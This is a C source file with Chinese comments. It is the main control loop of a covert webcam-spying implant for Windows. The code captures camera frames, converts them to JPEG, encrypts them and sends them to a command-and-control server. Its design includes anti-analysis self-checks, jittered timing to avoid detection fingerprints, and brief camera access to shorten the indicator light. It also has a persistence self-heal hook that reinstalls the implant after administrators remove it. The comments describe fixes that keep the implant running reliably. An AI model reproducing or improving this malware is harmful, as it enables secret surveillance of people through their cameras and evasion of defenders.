/*
 * agent_windows/src/implant.c
 *
 * 植入体主循环：采集 → 转码 → 打包 → 回传 的状态机编排。
 *
 * 不重复实现任何一层：
 *   采集  —— camera.h（mf / mock 后端可替换）
 *   打包  —— pack 回调（真实部署接 20_packer）
 *   回传  —— exfil 回调（真实部署接 21_exfil）
 *   对抗  —— defend 回调（真实部署接 19_defense）
 *
 * 时间全部走注入的 now_us；未注入时退化为秒级 time()，
 * 真实部署必须由调用方注入毫秒/微秒级时间源（抖动与间隔依赖精度）。
 */

#include "implant.h"

#include <stdlib.h>
#include <string.h>
#include <time.h>

#define IMPLANT_JPEG_CAP_DEFAULT (1u << 20)   /* 1 MiB 转码缓冲 */
#define IMPLANT_ART_CAP_DEFAULT  (1u << 20)   /* 1 MiB 制品缓冲 */
/* 原始帧缓冲。1920x1080 RGB24 = 6.2MB，NV12 = 3.1MB，YUYV = 4.1MB，
 * 取 16MiB 覆盖常见分辨率的所有原生格式。 */
#define IMPLANT_RAW_CAP_DEFAULT  (16u << 20)

struct implant {
    implant_cfg_t     cfg;
    cam_source_t     *src;

    implant_now_us_t  now_fn;    void *now_ud;
    implant_pack_t    pack_fn;   void *pack_ud;
    implant_exfil_t   exfil_fn;  void *exfil_ud;
    implant_defend_t  defend_fn; void *defend_ud;
    /* 等待期让出 CPU 的钩子。未注入则 ST_WAIT 直接返回（busy-spin）。
     * 见 implant_run 里 guard 判据的注释：真实时间源 + 等待态 busy-spin
     * 会在第一个批间隔就把 guard 跑满。 */
    implant_sleep_us_t sleep_fn; void *sleep_ud;
    implant_audit_t   audit_fn;  void *audit_ud;

    uint8_t  *jpeg_buf;  size_t jpeg_cap;  size_t jpeg_len;
    uint8_t  *art_buf;   size_t art_cap;   size_t art_len;
    /* 原始帧必须先拷进来再用：capture() 返回的缓冲区归 source 所有，
     * 下次 capture 或 close 之后即失效。跨状态持有其指针是 use-after-free。 */
    uint8_t  *raw_buf;   size_t raw_cap;   size_t raw_len;
    cam_pixel_fmt_t raw_fmt;
    uint32_t raw_w, raw_h;
    uint64_t raw_pts;

    implant_state_t state;
    uint32_t        batches_done;
    uint32_t        batch_frames;   /* 本批已完成的帧数 */
    uint64_t        frames_total;
    uint64_t        bytes_total;
    uint32_t        errors;
    implant_err_t   last_err;

    int      opened;       /* 设备句柄是否已打开 */
    int      defend_done;
    int      stop_req;
    uint64_t deadline_us;
    uint64_t last_gap_ms;
    uint64_t rng;          /* xorshift64 状态，用于抖动 */
};

/* ---------- 默认时间源（秒级，仅供未注入时的退化路径） ---------- */
static uint64_t default_now_us(void *ud)
{
    (void)ud;
    return (uint64_t)time(NULL) * 1000000ULL;
}

/* ---------- xorshift64：可复现抖动，不用 rand() ----------
 * 理由与 21_exfil/src/sched.c 一致：rand() 是进程全局状态，
 * 会被其它代码推进，同 seed 不可复现，抖动范围无法断言。
 * 状态为 0 是不动点（恒输出 0，抖动退化成恒定间隔，反而制造周期指纹），
 * 故 init 时强制非 0。
 */
static uint64_t xs64(uint64_t *s)
{
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    *s = x;
    return x;
}

static uint64_t now_of(implant_t *im)
{
    return im->now_fn ? im->now_fn(im->now_ud) : default_now_us(NULL);
}

const char *implant_errstr(implant_err_t e)
{
    switch (e) {
    case IMPLANT_OK:              return "ok";
    case IMPLANT_ERR_PARAM:       return "invalid parameter";
    case IMPLANT_ERR_MEM:         return "out of memory";
    case IMPLANT_ERR_NO_DEVICE:   return "no camera device";
    case IMPLANT_ERR_NO_PERM:     return "camera permission denied";
    case IMPLANT_ERR_OPEN:        return "device open failed";
    case IMPLANT_ERR_CAPTURE:     return "capture failed";
    case IMPLANT_ERR_CONVERT:     return "jpeg convert failed";
    case IMPLANT_ERR_PACK:        return "pack failed (refusing plaintext)";
    case IMPLANT_ERR_EXFIL:       return "exfil failed";
    case IMPLANT_ERR_DEFEND:      return "defense self-check unsafe";
    case IMPLANT_STOPPED:         return "stopped";
    default:                      return "unknown";
    }
}

const char *implant_state_name(implant_state_t s)
{
    switch (s) {
    case ST_INIT:    return "INIT";
    case ST_DEFEND:  return "DEFEND";
    case ST_WAIT:    return "WAIT";
    case ST_CAPTURE: return "CAPTURE";
    case ST_CONVERT: return "CONVERT";
    case ST_PACK:    return "PACK";
    case ST_EXFIL:   return "EXFIL";
    case ST_DONE:    return "DONE";
    case ST_FAIL:    return "FAIL";
    default:         return "?";
    }
}

implant_t *implant_create(const implant_cfg_t *cfg, const char *backend)
{
    if (!cfg) return NULL;

    implant_t *im = (implant_t *)calloc(1, sizeof(*im));
    if (!im) return NULL;

    im->cfg  = *cfg;
    im->state = ST_INIT;

    /* 抖动状态：非 0 起步 */
    im->rng = (uint64_t)cfg->interval_ms * 2654435761u + 0x9E3779B97F4A7C15ull;
    if (im->rng == 0) im->rng = 0x123456789abcdef0ull;

    im->jpeg_cap = IMPLANT_JPEG_CAP_DEFAULT;
    im->art_cap  = IMPLANT_ART_CAP_DEFAULT;
    im->raw_cap  = IMPLANT_RAW_CAP_DEFAULT;
    im->jpeg_buf = (uint8_t *)malloc(im->jpeg_cap);
    im->art_buf  = (uint8_t *)malloc(im->art_cap);
    im->raw_buf  = (uint8_t *)malloc(im->raw_cap);
    if (!im->jpeg_buf || !im->art_buf || !im->raw_buf) {
        free(im->jpeg_buf); free(im->art_buf); free(im->raw_buf); free(im);
        return NULL;
    }

    im->src = cam_source_create(backend);
    if (!im->src) {
        free(im->jpeg_buf); free(im->art_buf); free(im->raw_buf); free(im);
        return NULL;
    }

    if (cfg->frames_per_batch == 0) im->cfg.frames_per_batch = 1;
    if (cfg->jpeg_quality == 0)     im->cfg.jpeg_quality = 75;

    return im;
}

void implant_destroy(implant_t *im)
{
    if (!im) return;
    if (im->opened && im->src && im->src->close) {
        im->src->close(im->src);
        im->opened = 0;
    }
    if (im->src) cam_source_destroy(im->src);
    if (im->raw_buf)  { memset(im->raw_buf, 0, im->raw_len); free(im->raw_buf); }
    if (im->jpeg_buf) { memset(im->jpeg_buf, 0, im->jpeg_len); free(im->jpeg_buf); }
    if (im->art_buf)  { memset(im->art_buf, 0, im->art_len); free(im->art_buf); }
    /* 清掉缓冲里的帧数据，避免明文残留在堆上 */
    memset(im, 0, sizeof(*im));
    free(im);
}

void implant_set_now(implant_t *im, implant_now_us_t fn, void *ud)
{
    if (!im) return;
    im->now_fn = fn; im->now_ud = ud;
}

void implant_set_pack(implant_t *im, implant_pack_t fn, void *ud)
{
    if (!im) return;
    im->pack_fn = fn; im->pack_ud = ud;
}

void implant_set_exfil(implant_t *im, implant_exfil_t fn, void *ud)
{
    if (!im) return;
    im->exfil_fn = fn; im->exfil_ud = ud;
}

void implant_set_defend(implant_t *im, implant_defend_t fn, void *ud)
{
    if (!im) return;
    im->defend_fn = fn; im->defend_ud = ud;
}

void implant_set_sleep(implant_t *im, implant_sleep_us_t fn, void *ud)
{
    if (!im) return;
    im->sleep_fn = fn; im->sleep_ud = ud;
}

void implant_set_audit(implant_t *im, implant_audit_t fn, void *ud)
{
    if (!im) return;
    im->audit_fn = fn; im->audit_ud = ud;
}

void implant_stop(implant_t *im)
{
    if (!im) return;
    im->stop_req = 1;
}

/* 记录错误并按 stop_on_error 决定去向。返回给 step 的码 */
static implant_err_t fail_step(implant_t *im, implant_err_t e)
{
    im->last_err = e;
    im->errors++;
    if (im->cfg.stop_on_error || e == IMPLANT_ERR_DEFEND) {
        im->state = ST_FAIL;
    }
    return e;
}

implant_err_t implant_step(implant_t *im)
{
    if (!im) return IMPLANT_ERR_PARAM;

    switch (im->state) {

    case ST_INIT: {
        /* 确认有设备、有权限，再进入后续流程 */
        cam_device_info_t info[4];
        int n = im->src->enumerate ? im->src->enumerate(info, 4) : 0;
        if (n <= 0) return fail_step(im, IMPLANT_ERR_NO_DEVICE);
        if (im->src->check_permission && !im->src->check_permission())
            return fail_step(im, IMPLANT_ERR_NO_PERM);
        /* 首批不等，直接进入 */
        im->deadline_us = now_of(im);
        im->state = ST_DEFEND;
        return IMPLANT_OK;
    }

    case ST_DEFEND: {
        if (im->defend_done) { im->state = ST_WAIT; return IMPLANT_OK; }
        if (im->cfg.run_defend) {
            if (!im->defend_fn) return fail_step(im, IMPLANT_ERR_DEFEND);
            if (im->defend_fn(im->defend_ud) != 0)
                return fail_step(im, IMPLANT_ERR_DEFEND);
        }
        im->defend_done = 1;
        im->state = ST_WAIT;
        return IMPLANT_OK;
    }

    case ST_WAIT: {
        if (im->stop_req) { im->state = ST_DONE; return IMPLANT_STOPPED; }
        if (im->cfg.max_batches && im->batches_done >= im->cfg.max_batches) {
            im->state = ST_DONE;
            return IMPLANT_STOPPED;
        }
        uint64_t now = now_of(im);
        if (now < im->deadline_us) {
            /* 仍在等待：让出 CPU。
             *
             * 不睡的后果有两层，第二层才致命：
             *   1) 等待期 busy-spin 吃满一个核，top 里一眼可见；
             *   2) implant_run 的 guard 计的是 step 次数，50ms 的批间隔
             *      就能 busy-spin 跑满一百万次并被判成死循环 —— 常驻
             *      进程于是只发一批就退出。
             * 未注入 sleep 钩子时保持原行为，测试注入固定时间源的单步
             * 用例不受影响。 */
            if (im->sleep_fn)
                im->sleep_fn(im->deadline_us - now, im->sleep_ud);
            return IMPLANT_OK;
        }
        /* 注意：此处不动 last_gap_ms。它只表示「上一批结束后排定的间隔」，
         * 由 EXFIL 写入。若在这里改成「实际超时量」，调用方会读到两种含义
         * 混在一起的数值，无法据此判断调度是否正常。 */

        /* 开设备。每批开一次，批结束即关，缩短指示灯窗口 */
        if (!im->opened) {
            if (im->src->open(im->src, &im->cfg.cam) != CAM_OK)
                return fail_step(im, IMPLANT_ERR_OPEN);
            im->opened = 1;
        }
        im->batch_frames = 0;
        im->state = ST_CAPTURE;
        return IMPLANT_OK;
    }

    case ST_CAPTURE: {
        cam_frame_t fr;
        memset(&fr, 0, sizeof(fr));
        if (!im->src->capture) return fail_step(im, IMPLANT_ERR_CAPTURE);
        cam_err_t ce = im->src->capture(im->src, &fr);
        if (ce != CAM_OK) return fail_step(im, IMPLANT_ERR_CAPTURE);
        if (!fr.data || fr.len == 0) return fail_step(im, IMPLANT_ERR_CAPTURE);
        if (fr.len > im->raw_cap) return fail_step(im, IMPLANT_ERR_CAPTURE);
        /* 必须拷贝：fr.data 归 source 所有，跨状态持有即 use-after-free */
        memcpy(im->raw_buf, fr.data, fr.len);
        im->raw_len = fr.len;
        im->raw_fmt = fr.fmt;
        im->raw_w   = fr.width;
        im->raw_h   = fr.height;
        im->raw_pts = fr.pts_us;
        im->state = ST_CONVERT;
        return IMPLANT_OK;
    }

    case ST_CONVERT: {
        cam_frame_t f;
        memset(&f, 0, sizeof(f));
        f.data   = im->raw_buf;
        f.len    = im->raw_len;
        f.fmt    = im->raw_fmt;
        f.width  = im->raw_w;
        f.height = im->raw_h;
        f.pts_us = im->raw_pts;
        size_t cap = im->jpeg_cap, len = 0;
        if (cam_frame_to_jpeg(&f, im->jpeg_buf, &cap, &len) != CAM_OK)
            return fail_step(im, IMPLANT_ERR_CONVERT);
        if (len == 0) return fail_step(im, IMPLANT_ERR_CONVERT);
        im->jpeg_len = len;
        im->state = ST_PACK;
        return IMPLANT_OK;
    }

    case ST_PACK: {
        if (!im->pack_fn) return fail_step(im, IMPLANT_ERR_PACK);
        /* cap 既是入参（缓冲容量）也是出参（实际制品长度） */
        size_t cap = im->art_cap;
        if (im->pack_fn(im->jpeg_buf, im->jpeg_len,
                        im->art_buf, &cap, im->pack_ud) != 0)
            return fail_step(im, IMPLANT_ERR_PACK);
        im->art_len = cap;
        im->state = ST_EXFIL;
        return IMPLANT_OK;
    }

    case ST_EXFIL: {
        if (!im->exfil_fn) return fail_step(im, IMPLANT_ERR_EXFIL);
        if (im->exfil_fn(im->art_buf, im->art_len, "cam", im->exfil_ud) != 0)
            return fail_step(im, IMPLANT_ERR_EXFIL);

        im->frames_total++;
        im->bytes_total += im->art_len;
        im->batch_frames++;

        /* 批内还有帧？继续采 */
        if (im->batch_frames < im->cfg.frames_per_batch) {
            im->state = ST_CAPTURE;
            return IMPLANT_OK;
        }

        /* 本批结束：立即释放设备句柄（缩短指示灯窗口） */
        if (im->opened) { im->src->close(im->src); im->opened = 0; }
        im->batches_done++;

        /* 批结束钩子。驻留周期性自检挂在这里：管理员删掉驻留后，若只有启动
         * 时那一次 ensure，常驻进程不重启就永不自愈。返回值刻意不参与状态
         * 机——自检失败不该让采集停摆，那是"自愈机制反而杀死植入体"。 */
        if (im->audit_fn) (void)im->audit_fn(im->batches_done, im->audit_ud);

        /* 下一批的到期时间 = now + interval + jitter */
        uint64_t gap = im->cfg.interval_ms;
        if (im->cfg.jitter_ms)
            gap += xs64(&im->rng) % (uint64_t)(im->cfg.jitter_ms + 1);
        im->last_gap_ms = gap;
        im->deadline_us = now_of(im) + gap * 1000ULL;

        im->state = ST_WAIT;
        return IMPLANT_OK;
    }

    case ST_DONE:
        return IMPLANT_STOPPED;

    case ST_FAIL:
        return im->last_err ? im->last_err : IMPLANT_ERR_CAPTURE;

    default:
        return IMPLANT_ERR_PARAM;
    }
}

implant_err_t implant_run(implant_t *im)
{
    if (!im) return IMPLANT_ERR_PARAM;

    uint64_t guard = 0;
    uint64_t last_now = now_of(im);
    for (;;) {
        implant_err_t e = implant_step(im);
        if (e == IMPLANT_STOPPED || im->state == ST_DONE) return IMPLANT_STOPPED;

        if (e != IMPLANT_OK) {
            /* 对抗自检失败必须终止：判定的就是「这台机器不安全」，
             * 继续跑等于把采集证据留在不安全环境里。 */
            if (e == IMPLANT_ERR_DEFEND) return e;
            if (im->cfg.stop_on_error) return e;

            /* 常驻进程：单批失败不终止整个守护。
             *
             * fail_step 在 stop_on_error 为假时刻意不改 state（避免把
             * 可恢复的单批失败升级成终态），但这也意味着失败的那一步会
             * 被原样重试——本批制品已失效、设备句柄可能已关，重试必然
             * 再失败。所以这里必须显式把状态机推回 WAIT 并排定下一批，
             * 让下一批重新走完整的「开设备→采集→转码→封装→回传」。
             *
             * 在此之前，implant_run 只判 e != IMPLANT_OK 就返回，于是
             * 配置里写着 stop_on_error=false 的常驻进程仍会因为一次
             * 回传失败（C2 抖动、对端重启、网络切换都是常态）而整体退出。
             * systemd 的 Restart=always 会把这件事掩盖成「不停重启、
             * 每次只发一批」，cron 下则是每周期只发一批 —— 部署侧看到
             * 进程在跑、也有字节，无从发现。 */
            if (im->opened) { im->src->close(im->src); im->opened = 0; }

            /* 失败批必须计入 batches_done。
             *
             * 此前只有成功路径末尾才递增，于是回传持续失败时（C2 不可达、
             * 对端重启、网络切换都是常态）batches_done 恒为 0，ST_WAIT 的
             * 「batches_done >= max_batches」永不成立 —— 常驻进程无限重试，
             * max_batches 形同虚设。
             *
             * 后果在 cron 形态下最重：部署用 --batches N 限定批次，指望它
             * 跑完 N 批就退出；失败时它永不退出，cron 下一周期再拉起一个，
             * 进程逐周期堆积，且每个都在重试回传。systemd 形态下则是
             * 表面上 Restart=always 在管，实际 max_batches 从未生效过。 */
            im->batches_done++;

            /* 失败批同样是批结束：驻留自检照常发生。否则长期回传失败期间
             * 管理员删掉驻留后不会被补装 —— 恰恰是最需要自愈的窗口。 */
            if (im->audit_fn) (void)im->audit_fn(im->batches_done, im->audit_ud);

            uint64_t gap = im->cfg.interval_ms;
            if (im->cfg.jitter_ms)
                gap += xs64(&im->rng) % (uint64_t)(im->cfg.jitter_ms + 1);
            im->last_gap_ms = gap;
            im->deadline_us = now_of(im) + gap * 1000ULL;
            im->state = ST_WAIT;
        }
        /* 死循环保护：判据是「时间源是否推进」，不是 step 次数。
         *
         * 按 step 计数时，ST_WAIT 的等待期会把 guard 跑满：批间隔 50ms
         * 就足够触发，于是 implant_run 返回 IMPLANT_ERR_PARAM，常驻进程
         * 只发出第一批就退出。systemd 下被 Restart=always 掩盖成「不停
         * 重启、每次只发一批」，cron 下则是每周期只发一批 —— 部署侧看
         * 到进程在跑、也有字节，无从发现。
         *
         * 改为只在时间源确实不推进时才累加：真实时间源下等待期时间在走，
         * guard 恒被重置；注入的固定时间源下才会在百万次后判定死循环。 */
        uint64_t now = now_of(im);
        if (now != last_now) { last_now = now; guard = 0; }
        else if (++guard > 1000000ULL) return IMPLANT_ERR_PARAM;
    }
}

const implant_stats_t *implant_stats(const implant_t *im)
{
    static implant_stats_t s;
    if (!im) return NULL;
    s.state        = im->state;
    s.batches_done = im->batches_done;
    s.frames_total = (uint32_t)im->frames_total;
    s.bytes_total  = im->bytes_total;
    s.errors       = im->errors;
    s.last_err     = im->last_err;
    s.last_gap_ms  = im->last_gap_ms;
    return &s;
}

implant_state_t implant_cur_state(const implant_t *im)
{
    return im ? im->state : ST_FAIL;
}
